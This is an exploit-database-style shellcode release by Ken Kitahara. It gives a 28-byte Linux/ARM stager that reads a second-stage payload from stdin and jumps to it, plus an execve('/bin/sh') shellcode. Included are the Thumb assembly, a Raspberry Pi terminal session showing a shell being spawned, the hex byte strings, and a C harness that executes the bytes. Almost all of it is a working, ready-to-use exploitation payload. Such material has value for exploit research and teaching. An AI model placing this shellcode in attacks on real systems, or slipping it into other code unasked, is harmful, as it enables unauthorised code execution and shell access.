/*
Title: Linux/ARM - read(0, buf, 0xff) stager + execve("/bin/sh", NULL, NULL) Shellcode (28 Bytes)
Date: 2018-08-30
Tested: armv7l (Raspberry Pi 3 Model B+)
Author: Ken Kitahara

pi@raspberrypi:~ $ uname -a
Linux raspberrypi 4.14.52-v7+ #1123 SMP Wed Jun 27 17:35:49 BST 2018 armv7l GNU/Linux
pi@raspberrypi:~ $ lsb_release -a
No LSB modules are available.
Distributor ID:	Raspbian
Description:	Raspbian GNU/Linux 9.4 (stretch)
Release:	9.4
Codename:	stretch
pi@raspberrypi:~ $ cat binsh.s
.section .text
.global _start

_start:
    .ARM
    add  lr, pc, #1
    bx   lr

    .THUMB
    // execve("/bin/sh", NULL, NULL)
    adr  r0, spawn
    eor  r1, r1, r1
    eor  r2, r2, r2
    strb r2, [r0, #7]
    mov  r7, #0xb
    svc  #1

spawn:
.ascii "/bin/shX"
pi@raspberrypi:~ $ as -o binsh.o binsh.s && ld -N -o binsh binsh.o
pi@raspberrypi:~ $ ./binsh
$ id
uid=1000(pi) gid=1000(pi) groups=1000(pi),4(adm),20(dialout),24(cdrom),27(sudo),29(audio),44(video),46(plugdev),60(games),100(users),101(input),108(netdev),997(gpio),998(i2c),999(spi)
$ exit
pi@raspberrypi:~ $ objcopy -O binary binsh binsh.bin
pi@raspberrypi:~ $ hexdump -v -e '"\\""x" 1/1 "%02x" ""' binsh.bin && echo
\x01\xe0\x8f\xe2\x1e\xff\x2f\xe1\x02\xa0\x49\x40\x52\x40\xc2\x71\x0b\x27\x01\xdf\x2f\x62\x69\x6e\x2f\x73\x68\x58
pi@raspberrypi:~ $ cat stager.s
.section .text
.global _start

_start:
    .ARM
    add  lr, pc, #1
    bx   lr

    .THUMB
    // load shellcode into stack region
    // read(0, buf, 0xff)
    eor  r0, r0, r0
    mov  r1, sp
    mov  r2, #0xff
    mov  r7, #3
    svc  #1

    // change to ARM state
    eor  r7, r7, r7
    mov  lr, pc
    bx   lr

    .ARM
    mov  pc, r1
pi@raspberrypi:~ $ as -o stager.o stager.s && ld -N -o stager stager.o
pi@raspberrypi:~ $ (echo -en "\x01\xe0\x8f\xe2\x1e\xff\x2f\xe1\x02\xa0\x49\x40\x52\x40\xc2\x71\x0b\x27\x01\xdf\x2f\x62\x69\x6e\x2f\x73\x68\x58"; cat) | ./stager
id
uid=1000(pi) gid=1000(pi) groups=1000(pi),4(adm),20(dialout),24(cdrom),27(sudo),29(audio),44(video),46(plugdev),60(games),100(users),101(input),108(netdev),997(gpio),998(i2c),999(spi)
exit
^C
pi@raspberrypi:~ $ objcopy -O binary stager stager.bin
pi@raspberrypi:~ $ hexdump -v -e '"\\""x" 1/1 "%02x" ""' stager.bin && echo
\x01\xe0\x8f\xe2\x1e\xff\x2f\xe1\x40\x40\x69\x46\xff\x22\x03\x27\x01\xdf\x7f\x40\xfe\x46\x70\x47\x01\xf0\xa0\xe1
pi@raspberrypi:~ $

*/

#include<stdio.h>
#include<string.h>

unsigned char sc[] = \
"\x01\xe0\x8f\xe2\x1e\xff\x2f\xe1"
"\x40\x40\x69\x46\xff\x22\x03\x27"
"\x01\xdf\x7f\x40\xfe\x46\x70\x47"
"\x01\xf0\xa0\xe1";

void main()
{
    printf("Shellcode Length: %d\n", strlen(sc));

    int (*ret)() = (int(*)())sc;

    ret();
}